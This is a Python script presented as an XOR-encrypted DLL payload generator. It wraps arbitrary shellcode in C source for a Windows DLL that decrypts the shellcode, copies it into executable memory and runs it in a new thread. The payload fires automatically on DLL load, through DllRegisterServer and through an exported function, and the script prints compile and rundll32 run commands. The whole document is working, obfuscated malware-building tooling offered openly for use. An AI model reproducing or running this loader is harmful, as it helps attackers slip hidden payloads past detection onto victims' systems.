# XOR-encrypted DLL payload generator (Update 2.0)
import sys
import os

#Update 2.0 - XOR key (can be changed anytime)
XOR_KEY = b"\x13\x37\xC0\xDE"

#Update 2.0 - DLL template with XOR decryptor
DLL_TEMPLATE = r"""
#include <windows.h>
#include <stdio.h>

unsigned char encrypted_shellcode[] = {
{{ENCRYPTED_SHELLCODE}}
};

unsigned char xor_key[] = {
{{XOR_KEY}}
};

void decrypt_shellcode(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[i % sizeof(xor_key)];
    }
}

void inject_shellcode() {
    size_t len = sizeof(encrypted_shellcode);
    decrypt_shellcode(encrypted_shellcode, len);

    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    memcpy(exec, encrypted_shellcode, len);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (thread) CloseHandle(thread);

    SecureZeroMemory(encrypted_shellcode, len);  // Wipe encrypted shellcode from memory
}
// For use with service.cpp
__declspec(dllexport) //Change the Exported function to what every you want
void RunMe() {
    inject_shellcode();
}

__declspec(dllexport)
HRESULT __stdcall DllRegisterServer(void) {
    inject_shellcode();
    return S_OK;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        inject_shellcode();
    }
    return TRUE;
}
"""

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def format_bytes_as_c_array(data: bytes, columns: int = 8) -> str:
    hex_bytes = [f"0x{b:02x}," for b in data]
    return "\n" + "\n".join(
        "    " + " ".join(hex_bytes[i:i+columns])
        for i in range(0, len(hex_bytes), columns)
    )

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <shellcode.bin>")
        sys.exit(1)

    bin_path = sys.argv[1]
    if not os.path.exists(bin_path):
        print(f"[!] File not found: {bin_path}")
        sys.exit(1)

    with open(bin_path, "rb") as f:
        shellcode = f.read()

    encrypted = xor_encrypt(shellcode, XOR_KEY)
    encrypted_c = format_bytes_as_c_array(encrypted)
    key_c = format_bytes_as_c_array(XOR_KEY)

    final_code = DLL_TEMPLATE.replace("{{ENCRYPTED_SHELLCODE}}", encrypted_c)
    final_code = final_code.replace("{{XOR_KEY}}", key_c)

    output_file = "generated_xor_dll.c"
    with open(output_file, "w") as f:
        f.write(final_code)

    print(f"[+] XOR-encrypted DLL source generated: {output_file}")
    print(f"[+] Original shellcode size: {len(shellcode)} bytes")
    print(f"[+] Encrypted payload size: {len(encrypted)} bytes")
    print(f"[+] XOR key used ({len(XOR_KEY)} bytes): {XOR_KEY.hex()}")
    print()
    print("[*] To compile the DLL (using MinGW):")
    print("    x86_64-w64-mingw32-gcc -shared -o payload.dll generated_xor_dll.c")
    print()
    print("[*] Example execution (rundll32):")
    print("    rundll32 payload.dll,DllRegisterServer")

if __name__ == "__main__":
    main()
